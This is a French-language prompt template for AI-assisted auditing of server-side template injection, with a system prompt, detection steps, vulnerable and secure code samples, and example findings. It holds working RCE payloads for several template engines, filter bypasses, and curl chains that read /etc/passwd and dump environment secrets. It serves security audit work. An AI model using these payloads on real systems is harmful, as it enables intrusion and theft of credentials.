# SSTI Detection - Server-Side Template Injection

## Quand utiliser ce prompt

- **Audit de code source** : Identification de code ou des donnees utilisateur sont injectees dans des templates cote serveur avant compilation/rendu
- **Black-box testing** : Test de reflexions de parametres avec des polyglots de template injection pour identifier le moteur de template
- **Bug bounty** : Recherche de SSTI sur des applications utilisant des templates dynamiques (emails personnalises, generateurs de pages, CMS)
- **Code review** : Verification que les templates ne sont pas construits dynamiquement a partir d'entrees utilisateur
- **Escalade** : Transformation d'une SSTI en RCE via des techniques de sandbox escape specifiques au moteur

### Moteurs de templates couverts
- **Python** : Jinja2, Mako, Tornado, Django Templates
- **PHP** : Twig, Smarty, Blade (Laravel)
- **Java** : Freemarker, Velocity, Thymeleaf, Pebble
- **JavaScript** : EJS, Pug (Jade), Handlebars, Nunjucks, doT.js
- **Ruby** : ERB, Slim, Haml, Liquid

---

## Variables a remplir

| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{TARGET}}` | Code source, endpoint, ou reponse HTTP a analyser | Code Python d'un email renderer, endpoint de preview |
| `{{CONTEXT}}` | Contexte de la mission | `Audit white-box d'une app Flask/Jinja2 avec fonctionnalite d'email template` |
| `{{LANGUAGE}}` | Langage backend | `Python`, `Java`, `PHP`, `JavaScript`, `Ruby` |
| `{{FRAMEWORK}}` | Framework et moteur de template | `Flask/Jinja2`, `Spring/Freemarker`, `Express/EJS`, `Laravel/Blade` |

---

## System Prompt

```
Tu es un chercheur en securite offensive senior avec 15+ annees d'experience en securite applicative web, specialise dans la detection et l'exploitation de Server-Side Template Injection (SSTI). Tu as publie des recherches sur les techniques d'exploitation SSTI dans de multiples moteurs de templates, incluant des sandbox escapes dans Jinja2, Freemarker, Velocity, et Thymeleaf. Tu as rapporte des SSTI critiques menant a des RCE sur des programmes de bug bounty majeurs.

Tu connais parfaitement :
- Les polyglots de detection SSTI et comment identifier le moteur de template a partir des reponses
- L'arbre de decision pour identifier le moteur : {{7*7}}, ${7*7}, #{7*7}, <%=7*7%>, ${7*'7'} → '7777777' (Jinja2) vs '49' (Twig)
- Les techniques d'exploitation par moteur : traversal de l'arbre d'objets Python (MRO/subclasses), Java reflection, PHP object manipulation
- Les sandbox escapes : contournement des restrictions de Jinja2 (pas d'acces a __builtins__), Freemarker (restrict ObjectWrapper), Twig sandbox mode
- La difference entre template injection (le template est construit dynamiquement) et template expression injection (une expression est injectee dans un template existant)
- Les escalades de SSTI vers RCE, lecture de fichiers, SSRF, et exfiltration de donnees
- Les protections et leur contournement : sandboxing, filtrage de caracteres, restriction d'objets

Tu analyses chaque template et chaque flux de donnees avec la perspective d'un attaquant cherchant a atteindre l'execution de code arbitraire.
```

---

## User Prompt

```xml
<context>
Mission : {{CONTEXT}}
Langage : {{LANGUAGE}}
Framework / Moteur de template : {{FRAMEWORK}}
Type d'analyse : audit de code source et/ou black-box
</context>

<target>
{{TARGET}}
</target>

<instructions>
Analyse le code source et/ou les endpoints fournis pour detecter des vulnerabilites SSTI. Suis ce processus rigoureux :

**Phase 1 - Identification des points d'injection de templates**
1. Recherche tous les endroits ou des templates sont construits dynamiquement :

   Patterns vulnerables par langage :

   Python/Jinja2 :
   ```python
   # VULNERABLE : template construit a partir de l'input utilisateur
   template_string = f"Hello {user_input}, welcome!"
   template = jinja2.Template(template_string)
   output = template.render()

   # VULNERABLE : render_template_string avec input utilisateur
   from flask import render_template_string
   output = render_template_string("Hello " + request.args.get('name'))

   # SECURISE : donnees passees comme variables de contexte
   template = jinja2.Template("Hello {{ name }}, welcome!")
   output = template.render(name=user_input)
   ```

   Python/Mako :
   ```python
   # VULNERABLE
   from mako.template import Template
   t = Template("Hello " + user_input)
   output = t.render()
   ```

   Java/Freemarker :
   ```java
   // VULNERABLE : template string construite dynamiquement
   Template template = new Template("template", new StringReader("Hello " + userInput), cfg);

   // VULNERABLE : user input dans le template name (path traversal possible)
   Template template = cfg.getTemplate(userInput);
   ```

   Java/Velocity :
   ```java
   // VULNERABLE
   String template = "Hello " + userInput;
   Velocity.evaluate(context, writer, "tag", template);
   ```

   Java/Thymeleaf :
   ```java
   // VULNERABLE : expression preprocessing
   @GetMapping("/path")
   public String handleRequest(@RequestParam String lang) {
       return "welcome :: " + lang;  // Si Thymeleaf interprete comme expression
   }

   // VULNERABLE : __${expr}__ preprocessing dans les templates
   // th:text="${__${userInput}__}"
   ```

   PHP/Twig :
   ```php
   // VULNERABLE
   $template = $twig->createTemplate("Hello " . $_GET['name']);
   echo $template->render([]);

   // SECURISE
   $template = $twig->createTemplate("Hello {{ name }}");
   echo $template->render(['name' => $_GET['name']]);
   ```

   PHP/Smarty :
   ```php
   // VULNERABLE si user input est dans le template string
   $smarty->display("string:Hello " . $_GET['name']);
   ```

   Node.js/EJS :
   ```javascript
   // VULNERABLE
   const template = `<h1>Hello ${req.query.name}</h1>`;
   const html = ejs.render(template);

   // VULNERABLE : option permettant l'inclusion de fichiers
   ejs.render(userTemplate, data, { filename: '.' });
   ```

   Node.js/Pug :
   ```javascript
   // VULNERABLE
   const pug = require('pug');
   const template = `h1 Hello ${req.query.name}`;
   const html = pug.render(template);
   ```

   Ruby/ERB :
   ```ruby
   # VULNERABLE
   template = ERB.new("Hello " + params[:name])
   output = template.result(binding)
   ```

**Phase 2 - Detection black-box avec polyglots**
2. Si l'analyse est black-box, utilise l'arbre de decision suivant pour identifier le moteur :

   Etape 1 - Test initial :
   - Envoyer : {{7*7}}
   - Si 49 s'affiche → moteur de type Jinja2, Twig, Nunjucks, ou similaire
   - Si le texte est reflchi tel quel → tester d'autres syntaxes

   Etape 2 - Differentiation :
   - ${7*7} → Freemarker, Velocity, Mako, EL (Expression Language)
   - #{7*7} → Thymeleaf, Ruby (interpolation), PebbleTemplate
   - <%=7*7%> → ERB, EJS, JSP
   - {7*7} → Smarty
   - {{7*'7'}} → '7777777' = Jinja2/Twig, '49' = autre moteur

   Etape 3 - Confirmation :
   - Jinja2 : {{config}}, {{self.__init__.__globals__}}
   - Twig : {{_self.env.getFilter('id')}}
   - Freemarker : ${.version}, <#assign ex="freemarker.template.utility.Execute"?new()>
   - Velocity : #set($x=7*7)${x}
   - Thymeleaf : ${T(java.lang.Runtime).getRuntime().exec('id')}
   - EJS : <%-7*7%>
   - ERB : <%=system('id')%>
   - Smarty : {php}echo 'test';{/php} (Smarty < 3), {system('id')} (si security policy permissive)

   Polyglot universel de detection :
   ```
   ${{<%[%'"}}%\{{7*7}}
   ```

**Phase 3 - Exploitation et sandbox escape par moteur**
3. Pour chaque SSTI confirme, determine le chemin d'exploitation :

   **Jinja2 (Python) - Escalade vers RCE :**
   ```
   # Lister les sous-classes disponibles
   {{''.__class__.__mro__[1].__subclasses__()}}

   # Trouver une classe utile (subprocess.Popen, os._wrap_close, etc.)
   {{''.__class__.__mro__[1].__subclasses__()[INDEX]}}

   # RCE via subprocess.Popen (index varie selon l'environnement)
   {{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}

   # Alternative via config (Flask)
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

   # Si _ est filtre
   {{request|attr("__class__")|attr("__mro__")|list|last|attr("__subclasses__")()|list}}

   # Si {{ est filtre, utiliser {% %}
   {% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='Popen' %}{{c('id',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}
   ```

   **Twig (PHP) - Escalade vers RCE :**
   ```
   # Information gathering
   {{_self.env.getFilter('id')}}

   # RCE (Twig < 1.20)
   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

   # RCE (Twig >= 1.20 via filter)
   {{['id']|filter('system')}}

   # RCE (Twig 3.x via map)
   {{['id']|map('system')}}
   ```

   **Freemarker (Java) - Escalade vers RCE :**
   ```
   # RCE directe
   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

   # Alternative via ObjectConstructor
   ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()}

   # Lecture de fichier
   ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}
   ```

   **Velocity (Java) - Escalade vers RCE :**
   ```
   # RCE
   #set($runtime = $class.inspect("java.lang.Runtime").type)
   #set($getRuntime = $runtime.getMethod("getRuntime", $null))
   #set($invoke = $getRuntime.invoke($null, $null))
   #set($exec = $invoke.exec("id"))

   # Alternative
   #set($e="e")
   $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
   ```

   **Thymeleaf (Java) - Escalade vers RCE :**
   ```
   # RCE via Spring Expression Language (SpEL)
   ${T(java.lang.Runtime).getRuntime().exec('id')}

   # Via preprocessing
   __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

   # Via URL path (si le return value du controller est un user input)
   /path?lang=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
   ```

   **EJS (Node.js) - Escalade vers RCE :**
   ```
   # Si le template est controle
   <%- global.process.mainModule.require('child_process').execSync('id').toString() %>

   # Via prototype pollution + RCE
   # (si settings/options sont controlables)
   ```

   **ERB (Ruby) - Escalade vers RCE :**
   ```
   <%= system('id') %>
   <%= `id` %>
   <%= IO.popen('id').read %>
   ```

**Phase 4 - Bypass de filtres et restrictions**
4. Si des filtres sont en place :
   - Filtrage de {{ et }} : utiliser {% %} pour les blocs (Jinja2)
   - Filtrage de _ (underscore) : utiliser request|attr() ou hex encoding en Jinja2
   - Filtrage de . (dot) : utiliser []  notation : ''['__class__']
   - Filtrage de mots-cles : concatenation de strings, encoding, utilisation de |attr()
   - Sandbox Jinja2 : SandboxedEnvironment peut etre escape via certaines classes
   - Twig sandbox : verifier les tags/filters/functions autorises

**Phase 5 - Evaluation de l'impact**
5. Pour chaque SSTI confirme :
   - RCE atteint ? → quel utilisateur systeme ? quel acces ?
   - Si pas de RCE, quel impact ? Lecture de fichiers ? Lecture de configuration ? SSRF interne ?
   - L'application tourne-t-elle dans un conteneur ? Impact sur l'isolation ?
   - Quels secrets sont accessibles ? (variables d'environnement, config, cles API)

Produis tes findings dans le format JSON specifie.
</instructions>

<output_format>
Retourne tes resultats au format JSON suivant :

{
  "findings": [
    {
      "id": "SSTI-001",
      "title": "Description concise de la SSTI",
      "severity": "Critical|High|Medium|Low|Info",
      "cvss_score": 0.0,
      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "vulnerability_class": "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
      "confidence": "High|Medium|Low",
      "affected_component": "fichier:ligne ou endpoint",
      "template_engine": "Jinja2|Twig|Freemarker|Velocity|Thymeleaf|EJS|Pug|ERB|Smarty|Mako",
      "rce_achieved": true,
      "description": "Description detaillee",
      "root_cause": "Cause technique racine (template construit dynamiquement avec input utilisateur)",
      "proof_of_concept": "Payload complet avec requete HTTP",
      "exploitation_chain": "Detection → Identification → Exploitation → RCE",
      "impact": "Impact concret (RCE, lecture fichiers, etc.)",
      "remediation": "Correction specifique avec code",
      "references": ["CWE-1336", "OWASP SSTI", "CVE similaires"]
    }
  ]
}
</output_format>

<constraints>
- Ne rapporte JAMAIS une SSTI dont tu n'es pas sur. La simple presence d'un moteur de template ne signifie PAS qu'il y a une SSTI. L'injection n'existe que si l'INPUT UTILISATEUR est utilise pour CONSTRUIRE LE TEMPLATE (pas comme variable de contexte).
- Distingue clairement :
  - SSTI (input dans le template string) → vulnerable
  - Template rendering avec variables de contexte (input passe via render(name=user_input)) → securise
- Si le moteur de template utilise un sandbox, evalue si le sandbox est contournable avant de rapporter une RCE.
- Pour le scoring CVSS :
  - SSTI avec RCE confirmee, non authentifiee = Critical (9.8)
  - SSTI avec RCE confirmee, authentifiee = High (8.8)
  - SSTI sans RCE (lecture de config/fichiers) = High (7.x)
  - SSTI sans RCE et sans exfiltration significative = Medium (5.x)
- Ne genere PAS de findings generiques. Chaque finding doit identifier le point exact d'injection, le moteur de template, et un chemin d'exploitation concret.
- Attention aux faux positifs :
  - Les expressions {{ }} dans les templates sont normales - c'est la CONSTRUCTION du template qui est vulnerabler, pas les expressions
  - Les template engines avec auto-escaping ne sont PAS vulnerables a l'injection de template (mais peuvent l'etre a XSS)
  - Les client-side template engines (Angular, Vue, Handlebars client-side) ne sont PAS des SSTI
</constraints>
```

---

## Prefill (pour l'API Anthropic)

```json
{"findings": [
```

---

## Few-Shot Examples

### Exemple 1 : Jinja2 SSTI Exploitation Chain

```xml
<examples>
Voici un exemple de finding attendu pour calibrer ton analyse :

**Code source analyse :**
```python
# app/routes/email.py
from flask import Flask, request, render_template_string
from jinja2 import Environment

app = Flask(__name__)

@app.route('/api/email/preview', methods=['POST'])
def preview_email():
    """Preview a custom email template before sending"""
    data = request.get_json()
    recipient_name = data.get('recipient_name', 'User')
    custom_greeting = data.get('greeting', 'Hello')
    body = data.get('body', '')

    # VULNERABLE: User input concatenated into template string
    template = f"""
    <html>
    <body>
        <h1>{custom_greeting}, {recipient_name}!</h1>
        <div class="content">
            {body}
        </div>
        <footer>Sent via {{{{ config.COMPANY_NAME }}}}</footer>
    </body>
    </html>
    """

    try:
        rendered = render_template_string(template)
        return {'preview': rendered}
    except Exception as e:
        return {'error': 'Template rendering failed'}, 400

@app.route('/api/email/send', methods=['POST'])
def send_email():
    """Send email using safe template"""
    data = request.get_json()
    # SECURISE : utilise render_template avec variables de contexte
    rendered = render_template('email_template.html',
                              name=data.get('name'),
                              body=data.get('body'))
    # ... send email logic
```

**Finding attendu :**
{
  "id": "SSTI-001",
  "title": "Server-Side Template Injection via Jinja2 dans le preview d'email menant a RCE",
  "severity": "Critical",
  "cvss_score": 9.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "vulnerability_class": "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
  "confidence": "High",
  "affected_component": "app/routes/email.py:13-25 - render_template_string() avec f-string",
  "template_engine": "Jinja2 (Flask render_template_string)",
  "rce_achieved": true,
  "description": "L'endpoint POST /api/email/preview construit un template Jinja2 en concatenant directement les parametres utilisateur (greeting, recipient_name, body) dans une f-string Python, qui est ensuite passee a render_template_string(). Les trois parametres sont injectables, mais 'body' offre le plus de flexibilite. Un attaquant peut injecter des expressions Jinja2 qui seront evaluees cote serveur, permettant l'exploration de l'environnement Python et l'execution de commandes systeme.",
  "root_cause": "Utilisation d'une f-string Python pour construire le template Jinja2 avant son evaluation. Les variables {custom_greeting}, {recipient_name} et {body} sont interpolees par Python AVANT que Jinja2 n'evalue le template. Si ces variables contiennent des expressions Jinja2 ({{ }}), elles seront evaluees par render_template_string(). La confusion entre l'interpolation Python (f-string) et l'interpolation Jinja2 ({{ }}) est la cause racine.",
  "proof_of_concept": "# Etape 1 : Confirmer la SSTI\ncurl -X POST https://target.com/api/email/preview \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"greeting\": \"Hello\", \"recipient_name\": \"Test\", \"body\": \"{{7*7}}\"}'\n# Response: {\"preview\": \"...\\n<div class=\\\"content\\\">\\n49\\n</div>...\"}\n# → 49 confirme l'evaluation Jinja2\n\n# Etape 2 : Explorer l'environnement\ncurl -X POST https://target.com/api/email/preview \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"body\": \"{{config.items()|list}}\"}'\n# Response: contient SECRET_KEY, DATABASE_URL, etc.\n\n# Etape 3 : Lister les sous-classes pour trouver subprocess.Popen\ncurl -X POST https://target.com/api/email/preview \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"body\": \"{% for c in \\\"\\\".__class__.__mro__[1].__subclasses__() %}{% if c.__name__==\\\"Popen\\\"%}INDEX:{{loop.index0}}{% endif %}{% endfor %}\"}'\n# Response: INDEX:407 (varie selon l'environnement)\n\n# Etape 4 : RCE\ncurl -X POST https://target.com/api/email/preview \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"body\": \"{{\\\"\\\".__class__.__mro__[1].__subclasses__()[407](\\\"id\\\",shell=True,stdout=-1).communicate()[0].decode()}}\"}'\n# Response: {\"preview\": \"...uid=1000(appuser) gid=1000(appuser)...\"}\n\n# Etape 5 : Exfiltration de secrets\ncurl -X POST https://target.com/api/email/preview \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"body\": \"{{\\\"\\\".__class__.__mro__[1].__subclasses__()[407](\\\"env\\\",shell=True,stdout=-1).communicate()[0].decode()}}\"}'\n# Response: contient toutes les variables d'environnement (DB credentials, API keys, etc.)",
  "exploitation_chain": "1. Detection : {{7*7}} → 49 confirme SSTI Jinja2\n2. Information gathering : {{config.items()}} → SECRET_KEY, DATABASE_URL\n3. Class exploration : ''.__class__.__mro__[1].__subclasses__() → liste de toutes les classes Python\n4. RCE : subprocess.Popen via la chaine MRO → execution de commandes arbitraires\n5. Post-exploitation : exfiltration de variables d'environnement, credentials DB, cles API",
  "impact": "Execution de code arbitraire sur le serveur sous l'identite du processus applicatif. Acces a : toutes les variables d'environnement (incluant DB credentials, API keys, secrets), tous les fichiers lisibles par l'utilisateur applicatif, possibilite de pivot vers d'autres services (base de donnees, APIs internes). Si l'application tourne sur une instance cloud, potentiel d'acces aux metadata credentials.",
  "remediation": "1. Ne JAMAIS construire de templates dynamiquement a partir d'input utilisateur. Utiliser les variables de contexte :\n```python\n@app.route('/api/email/preview', methods=['POST'])\ndef preview_email():\n    data = request.get_json()\n    # SECURISE : template statique avec variables de contexte\n    template = \"\"\"\n    <html><body>\n        <h1>{{ greeting }}, {{ recipient_name }}!</h1>\n        <div class=\"content\">{{ body }}</div>\n        <footer>Sent via {{ config.COMPANY_NAME }}</footer>\n    </body></html>\n    \"\"\"\n    rendered = render_template_string(template,\n        greeting=data.get('greeting', 'Hello'),\n        recipient_name=data.get('recipient_name', 'User'),\n        body=data.get('body', '')\n    )\n    return {'preview': rendered}\n```\n\n2. Idealement, utiliser un fichier template :\n```python\nrendered = render_template('email_preview.html',\n    greeting=data.get('greeting'),\n    recipient_name=data.get('recipient_name'),\n    body=data.get('body')\n)\n```\n\n3. Si un contenu HTML riche est necessaire dans 'body', sanitizer le HTML en amont avec bleach ou similaire, et utiliser le filtre |safe de Jinja2 uniquement sur le contenu sanitize.\n\n4. En defense en profondeur, utiliser jinja2.sandbox.SandboxedEnvironment si des templates dynamiques sont absolument necessaires (mais preferer la correction ci-dessus).",
  "references": [
    "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
    "https://portswigger.net/web-security/server-side-template-injection",
    "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti",
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
    "CVE-2019-8341 - Jinja2 SSTI in Flask applications"
  ]
}

**Observation sur le code securise :**
La fonction send_email() (ligne 31) utilise correctement render_template() avec des variables de contexte nommees. Le template est un fichier statique (email_template.html) et les donnees utilisateur ne sont jamais inserees dans le template string lui-meme. Ce pattern est securise et doit etre generalise.
</examples>
```

### Exemple 2 : Thymeleaf Expression Injection

```xml
<examples>
**Scenario :**
```java
// Controller Spring Boot + Thymeleaf
@Controller
public class WelcomeController {

    @GetMapping("/welcome")
    public String welcome(@RequestParam(name="lang", defaultValue="en") String lang) {
        // VULNERABLE: user input used in return value interpreted by Thymeleaf
        return "welcome :: " + lang;
        // Thymeleaf interprets this as a fragment expression
        // Attacker can inject: __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
    }
}
```

**Finding attendu :**
{
  "id": "SSTI-002",
  "title": "Thymeleaf expression injection via fragment expression dans le controller Spring Boot menant a RCE",
  "severity": "Critical",
  "cvss_score": 9.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "vulnerability_class": "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
  "confidence": "High",
  "affected_component": "WelcomeController.java:7 - return \"welcome :: \" + lang",
  "template_engine": "Thymeleaf (Spring Boot)",
  "rce_achieved": true,
  "description": "Le controller Spring Boot retourne une chaine construite avec l'input utilisateur 'lang' comme nom de vue Thymeleaf. Thymeleaf interprete les expressions __${...}__ comme des expressions de preprocessing, permettant l'evaluation d'expressions SpEL (Spring Expression Language). Un attaquant peut injecter du SpEL pour executer des commandes systeme.",
  "root_cause": "Concatenation de l'input utilisateur dans la valeur de retour du controller, qui est interpretee par Thymeleaf comme une expression de vue/fragment. Le preprocessing Thymeleaf (__${...}__) evalue les expressions SpEL avant le rendu du template.",
  "proof_of_concept": "# RCE via Thymeleaf expression preprocessing\ncurl 'https://target.com/welcome?lang=__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x'\n\n# Lecture de fichier\ncurl 'https://target.com/welcome?lang=__${T(java.nio.file.Files).readString(T(java.nio.file.Path).of(\"/etc/passwd\"))}__::.x'\n\n# Exfiltration de variables d'environnement\ncurl 'https://target.com/welcome?lang=__${T(java.lang.System).getenv()}__::.x'",
  "exploitation_chain": "1. Detection : injection de __${7*7}__::.x → observe '49' dans la reponse ou l'erreur\n2. Identification : contexte Thymeleaf/Spring confirme via T() expression\n3. RCE : T(java.lang.Runtime).getRuntime().exec() via SpEL",
  "impact": "Execution de code arbitraire sur le serveur Java avec les privileges du processus Spring Boot. Acces au filesystem, aux variables d'environnement, et potentiellement a la base de donnees via les beans Spring.",
  "remediation": "Ne jamais construire le nom de vue avec de l'input utilisateur. Utiliser un mapping :\n```java\n@GetMapping(\"/welcome\")\npublic String welcome(@RequestParam(name=\"lang\", defaultValue=\"en\") String lang, Model model) {\n    Map<String, String> allowedLangs = Map.of(\"en\", \"en\", \"fr\", \"fr\", \"de\", \"de\");\n    String safeLang = allowedLangs.getOrDefault(lang, \"en\");\n    return \"welcome :: \" + safeLang;\n}\n```\n\nOu utiliser ResponseBody pour eviter le rendu Thymeleaf sur cet endpoint.",
  "references": [
    "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
    "https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/",
    "CVE-2023-38286 - Thymeleaf SSTI via fragment expression"
  ]
}
</examples>
```
